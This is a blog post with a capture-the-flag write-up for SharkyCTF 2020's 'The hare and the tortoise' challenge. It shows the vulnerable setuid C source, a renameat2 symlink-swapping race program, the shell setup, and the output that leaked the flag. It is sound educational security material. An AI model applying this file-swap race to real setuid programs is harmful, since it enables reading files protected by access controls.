<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#x200F;Nils's website - SharkyCTF 2020 The hare and the tortoise write-up</title><link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css"><link rel="stylesheet" type="text/css" href="/assets/css/post.css"><link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml"></head><body><header><h1><a href="/">Nils's website</a></h1></header><main><h2>SharkyCTF 2020 The hare and the tortoise write-up</h2><p>This weekend, with my <a href="https://ctftime.org/team/118762">team</a>, I participated to <a href="https://ctfd.sharkyctf.xyz">Sharky CTF</a>. We ended up 12th. Here is my write-up for the hare and the tortoise:</p><p>I’m doing a writeup for this one because I didn’t take the intended route to solve it so it might be interesting to share.</p><h3 id="description">Description:</h3><p>Do you know Jean de La Fontaine? A friend of mine created a program mimicking the hare and the tortoise. He told me that smart tortoises always wins. I want you to be that tortoise.</p><p>Connect with ssh tortoise@172.30.0.2. Password : tortoise.</p><p>Creator : Nofix</p><p>Attached is an <a href="https://ctfd.sharkyctf.xyz/naumachia/config/22">OpenVPN config</a> which gives access to a private network from which we can reach the server.</p><h3 id="solution">Solution</h3><p>After connecting to the server (@172.30.0.2), in the home directory there are some files:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tortoise@the_hare_and_the_tortoise$ ls -l
-r-------- 1 hare hare   77 May 11 09:04 flag.txt
-r--r--r-- 1 root root 2360 May 11 09:04 main.c
-r--r--r-- 1 root root  687 May 11 09:04 semaphores.h
-r-sr-xr-x 1 hare hare 2754 May 11 09:04 the_hare_and_the_tortoise
</code></pre></div></div><p>Only the <code class="language-plaintext highlighter-rouge">hare</code> user has access to the flag (stored in <code class="language-plaintext highlighter-rouge">flag.txt</code>), and there’s a suid binary that I guess was compiled from the source code in <code class="language-plaintext highlighter-rouge">main.c</code>.</p><p>Here is the source code:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"semaphores.h"</span><span class="cp">
</span>
<span class="c1">// The Hare and the Tortoise</span>


<span class="cp">#define handle_error(msg) \
    do { perror(msg); exit(EXIT_FAILURE); } while (0)
</span>

<span class="n">pid_t</span> <span class="n">ppid</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">sem</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">sem_name</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">temp_dir</span><span class="p">[</span><span class="mi">60</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="kt">char</span> <span class="n">lock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">ppid_dir</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">void</span> <span class="nf">cleanup</span><span class="p">(){</span>
  <span class="k">if</span><span class="p">(</span><span class="n">sem</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
    <span class="n">SEM_DEL</span><span class="p">(</span><span class="n">sem</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">rmdir</span><span class="p">(</span><span class="n">ppid_dir</span><span class="p">);</span>
  <span class="n">rmdir</span><span class="p">(</span><span class="n">sem_name</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sigint_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">){</span>
  <span class="n">cleanup</span><span class="p">();</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">){</span>
  <span class="n">cleanup</span><span class="p">();</span>
  <span class="n">kill</span><span class="p">(</span><span class="n">ppid</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">random_string</span><span class="p">(){</span>
  <span class="cm">/* Only one execution should be allowed per term */</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">ppid_dir</span><span class="p">,</span> <span class="s">"/tmp/%d"</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
  <span class="k">if</span><span class="p">(</span><span class="n">mkdir</span><span class="p">(</span><span class="n">ppid_dir</span><span class="p">,</span> <span class="mo">0700</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"There is no need for bruteforce"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">sprintf</span><span class="p">(</span><span class="n">temp_dir</span><span class="p">,</span> <span class="s">"/tmp/%d/XXXXXX"</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
  <span class="n">sem_name</span> <span class="o">=</span> <span class="n">mkdtemp</span><span class="p">(</span><span class="n">temp_dir</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">sem_name</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span> <span class="n">perror</span><span class="p">(</span><span class="s">"mkdtemp failed: "</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">){</span>

  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Usage : %s &lt;file to read&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">atexit</span><span class="p">(</span><span class="n">cleanup</span><span class="p">);</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sigint_handler</span><span class="p">);</span>
  <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">alarm_handler</span><span class="p">);</span>
  <span class="n">random_string</span><span class="p">();</span>
  <span class="n">sem</span> <span class="o">=</span> <span class="n">semget</span><span class="p">(</span><span class="n">ftok</span><span class="p">(</span><span class="n">sem_name</span><span class="p">,</span> <span class="mi">1337</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="n">IPC_EXCL</span> <span class="o">|</span> <span class="mo">0600</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">sem</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">handle_error</span><span class="p">(</span><span class="s">"semget"</span><span class="p">);</span>

  <span class="n">SEM_SET</span><span class="p">(</span><span class="n">sem</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">hare</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="kt">int</span> <span class="n">tortoise</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="n">hare</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="n">tortoise</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">handle_error</span><span class="p">(</span><span class="s">"open"</span><span class="p">);</span>
  <span class="n">ppid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
  <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>

  <span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The hare</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"The hare says : </span><span class="se">\"</span><span class="s">Do you ever get anywhere?</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
      <span class="n">SEM_WAIT</span><span class="p">(</span><span class="n">sem</span><span class="p">);</span>
      <span class="n">y</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">hare</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
      <span class="k">if</span><span class="p">(</span><span class="n">y</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">);</span><span class="n">handle_error</span><span class="p">(</span><span class="s">"read"</span><span class="p">);</span> <span class="p">}</span>
      <span class="n">usleep</span><span class="p">(</span><span class="mi">100</span> <span class="o">*</span> <span class="mi">750</span><span class="p">);</span>
      <span class="n">SEM_POST</span><span class="p">(</span><span class="n">sem</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"The hare says : </span><span class="se">\"</span><span class="s">Hurry up tortoise !</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
    <span class="n">alarm</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>

	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// The tortoise</span>
    <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">y</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
      <span class="n">SEM_WAIT</span><span class="p">(</span><span class="n">sem</span><span class="p">);</span>
      <span class="n">y</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">tortoise</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"The tortoise, progressing slowly... : </span><span class="se">\"</span><span class="s">%c</span><span class="se">\"\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="n">y</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span> <span class="n">handle_error</span><span class="p">(</span><span class="s">"read"</span><span class="p">);</span> <span class="p">}</span>
      <span class="n">SEM_POST</span><span class="p">(</span><span class="n">sem</span><span class="p">);</span>
      <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Slow but steady wins the race!"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>As you can see, a “hare” process is created (as a child) of the “tortoise” process. The “tortoise” process starts to read the file passed by <code class="language-plaintext highlighter-rouge">argv[1]</code> (the first argument). However, the hare process, after reading the same file a lot more quicker, sends a <code class="language-plaintext highlighter-rouge">SIGALARM</code> signal preventing the “tortoise” process from finishing.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ~/the_hare_and_the_tortoise ~/flag.txt
The tortoise, progressing slowly... : "s"
The hare says : "Do you ever get anywhere?"
The tortoise, progressing slowly... : "h"
The tortoise, progressing slowly... : "k"
The tortoise, progressing slowly... : "C"
The tortoise, progressing slowly... : "T"
The tortoise, progressing slowly... : "F"
The hare says : "Hurry up tortoise !"
The tortoise, progressing slowly... : "{"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "c"
Killed
</code></pre></div></div><p>After trying to understand how system V semaphores worked and not understanding anything, I fell back to a simpler solution: The “hare” and “tortoise” process each have their own file descriptor. The idea is to have the “hare” and “tortoise” process open different files. The “hare” process would open a very large file which will take time to be read, allowing the “tortoise” process to have the time to read <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p><p>The solution I took is based on <a href="https://www.youtube.com/watch?v=5g137gsB9Wk">a video</a> from <a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">liveoverflow</a>, which I had watched earlier this year.</p><p>I compiled the following code:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L
#define _ATFILE_SOURCE
</span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_renameat2</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="s">"sparse"</span><span class="p">,</span> <span class="n">RENAME_EXCHANGE</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>and then created a large file “sparse”, and a symlink to the flag inside of my working directory in <code class="language-plaintext highlighter-rouge">/tmp</code>.</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> ~/flag.txt flag
<span class="nb">truncate</span> <span class="nt">-s</span> 10G sparse
</code></pre></div></div><p>A <a href="https://en.wikipedia.org/wiki/Sparse_file">sparse file</a> is a file that doesn’t take space on disk (think of it like compression (I feel like some people will hate me for this definition)).</p><p>The <code class="language-plaintext highlighter-rouge">racing.c</code> program will swap the <code class="language-plaintext highlighter-rouge">flag</code> symlink and <code class="language-plaintext highlighter-rouge">sparse</code> file thousands of times a seconds and hopefully, when the file descriptor is opened for the “hare”, the sparse file will be the one having the name <code class="language-plaintext highlighter-rouge">flag</code> and the when the tortoise opens the file, the symlink to <code class="language-plaintext highlighter-rouge">~/flag.txt</code>.</p><p>In one terminal, I ran the racing program that switches the files:</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc racing.c
./a.out
</code></pre></div></div><p>And in another, I ran the suid binary on <code class="language-plaintext highlighter-rouge">flag</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ~/the_hare_and_the_tortoise flag
The tortoise, progressing slowly... : ""
The hare says : "Do you ever get anywhere?"
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
$ ~/the_hare_and_the_tortoise flag
The tortoise, progressing slowly... : ""
The hare says : "Do you ever get anywhere?"
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
The tortoise, progressing slowly... : ""
$ ~/the_hare_and_the_tortoise flag
The tortoise, progressing slowly... : "s"
The hare says : "Do you ever get anywhere?"
The tortoise, progressing slowly... : "h"
The tortoise, progressing slowly... : "k"
The tortoise, progressing slowly... : "C"
The tortoise, progressing slowly... : "T"
The tortoise, progressing slowly... : "F"
The tortoise, progressing slowly... : "{"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "c"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "5"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "s"
The tortoise, progressing slowly... : "i"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "w"
The tortoise, progressing slowly... : "h"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "n"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "y"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "u"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "l"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "n"
The tortoise, progressing slowly... : "e"
The tortoise, progressing slowly... : "_"
The tortoise, progressing slowly... : "6"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "2"
The tortoise, progressing slowly... : "6"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "2"
The tortoise, progressing slowly... : "6"
The tortoise, progressing slowly... : "c"
The tortoise, progressing slowly... : "5"
The tortoise, progressing slowly... : "7"
The tortoise, progressing slowly... : "f"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "1"
The tortoise, progressing slowly... : "2"
The tortoise, progressing slowly... : "e"
The tortoise, progressing slowly... : "d"
The tortoise, progressing slowly... : "6"
The tortoise, progressing slowly... : "6"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "b"
The tortoise, progressing slowly... : "8"
The tortoise, progressing slowly... : "c"
The tortoise, progressing slowly... : "2"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "e"
The tortoise, progressing slowly... : "5"
The tortoise, progressing slowly... : "3"
The tortoise, progressing slowly... : "8"
The tortoise, progressing slowly... : "a"
The tortoise, progressing slowly... : "0"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "}"
The tortoise, progressing slowly... : "}"
Slow but steady wins the race!
</code></pre></div></div><p>After multiple tries, the tortoise opened the symlink to <code class="language-plaintext highlighter-rouge">flag.txt</code> instead of the sparse file and I was able to transform the lines into a flag:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shkCTF{r4c35_4r3_3asi3r_wh3n_y0u_4r3_al0ne_6a26a26c57f0012ed66ab8c20e538a04}
</code></pre></div></div><p>Thank you to <a href="https://github.com/seanjpagano">seanjpagano</a>, for your <a href="https://github.com/LibWTF/ctf_writeups/blob/master/SharkyCTF-2020/The_hare_and_the_tortoise.md">writeup</a> which I used in order to get the files.</p><time datetime="2020-05-11">11 May 2020</time></main><footer> &copy; 2021, 2024 <a href="https://www.nilsand.re/">Nils André</a></footer></body></html>